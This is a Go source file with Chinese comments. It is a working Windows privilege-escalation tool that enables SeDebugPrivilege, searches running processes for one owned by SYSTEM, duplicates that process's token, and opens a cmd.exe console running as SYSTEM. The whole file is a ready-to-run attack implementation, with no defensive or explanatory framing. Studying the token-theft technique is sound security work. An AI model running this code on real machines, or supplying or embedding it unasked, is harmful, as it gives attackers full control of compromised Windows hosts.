package main

import (
	"fmt"
	"syscall"
	"unsafe"
)
const (
	SecurityAnonymous      = 0
	SecurityIdentification = 1
	SecurityImpersonation  = 2
	SecurityDelegation     = 3

	TokenPrimary = 1
)
const MAXIMUM_ALLOWED = 0x02000000
const SE_PRIVILEGE_ENABLED = 0x00000002
var CREATE_NEW_CONSOLE = 0x00000010

type LUID struct {
	LowPart uint32
	HighPart int32
}
type LUID_AND_ATTRIBUTES struct {
	Luid LUID
	Attributes uint32
}
type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges [1]LUID_AND_ATTRIBUTES
}
type User struct {
	SID     string
	Account string
	Domain  string
	Type    uint32
}

var Apdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
var TokenHandle syscall.Token
var TP TOKEN_PRIVILEGES
var NULL uintptr
var ProcessEntry syscall.ProcessEntry32
var PROCESS_ALL_ACCESS uint32 = 0x1F0FFF
var Tok syscall.Token
var startupInfo syscall.StartupInfo


func EnableDebugPrivilege(){
	// 将进程权限提升至Debug权限
	CurrentHandle, _ := syscall.GetCurrentProcess() // 获取当前的进程句柄
	syscall.OpenProcessToken(CurrentHandle,syscall.TOKEN_ALL_ACCESS,&TokenHandle) // 获取当前进程的令牌句柄
	TP.PrivilegeCount = 1
	TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	Apdvapi32.NewProc("LookupPrivilegeValueW").Call(NULL,uintptr(unsafe.Pointer(SE_DEBUG_NAME)),uintptr(unsafe.Pointer(&TP.Privileges[0].Luid)))
	Apdvapi32.NewProc("AdjustTokenPrivileges").Call(uintptr(TokenHandle),uintptr(0),uintptr(unsafe.Pointer(&TP)),NULL,NULL)
}

func GetTokenUser(token syscall.Token) (User, error) {
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return User{}, err
	}
	var user User
	user.SID, err = tokenUser.User.Sid.String()
	if err != nil {
		return user, err
	}
	user.Account, user.Domain, user.Type, err = tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return user, err
	}
	return user, nil
}


func main(){
	EnableDebugPrivilege()
	var phNewToken syscall.Token
	var ProcessInformation syscall.ProcessInformation
	Snapshot ,_ := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS,0) // 为全体进程拍摄快照
	ProcessEntry.Size = uint32(unsafe.Sizeof(ProcessEntry))
	err := syscall.Process32First(Snapshot,&ProcessEntry)
	if err == nil {
		// 成功获取到第一个进程快照
		for {
			EachHandle,_:= syscall.OpenProcess(PROCESS_ALL_ACCESS,false,ProcessEntry.ProcessID) //获取一个进程的句柄
			syscall.OpenProcessToken(EachHandle,syscall.TOKEN_QUERY | syscall.TOKEN_DUPLICATE,&Tok) // 获取一个进程的令牌
			name,_:= GetTokenUser(Tok)
			if name.Account == "SYSTEM"{
				fmt.Println(name.Account)
				fmt.Println(ProcessEntry.ProcessID,syscall.UTF16ToString(ProcessEntry.ExeFile[:]))

				Apdvapi32.NewProc("DuplicateTokenEx").Call(
					uintptr(Tok),
					uintptr(MAXIMUM_ALLOWED),
					uintptr(0),
					SecurityImpersonation,
					TokenPrimary,
					uintptr(unsafe.Pointer(&phNewToken)))
				CmdPath ,_ := syscall.UTF16PtrFromString(`C:\\Windows\\system32\\cmd.exe`)

				Apdvapi32.NewProc("CreateProcessWithTokenW").Call(
					uintptr(phNewToken),
					0,
					uintptr(unsafe.Pointer(CmdPath)),
					uintptr(0),
					uintptr(CREATE_NEW_CONSOLE),
					uintptr(0),
					uintptr(0),
					uintptr(unsafe.Pointer(&startupInfo)),
					uintptr(unsafe.Pointer(&ProcessInformation)))
				break
			}
			err = syscall.Process32Next(Snapshot,&ProcessEntry)
			if err != nil {
				break
			}
		}
	}
}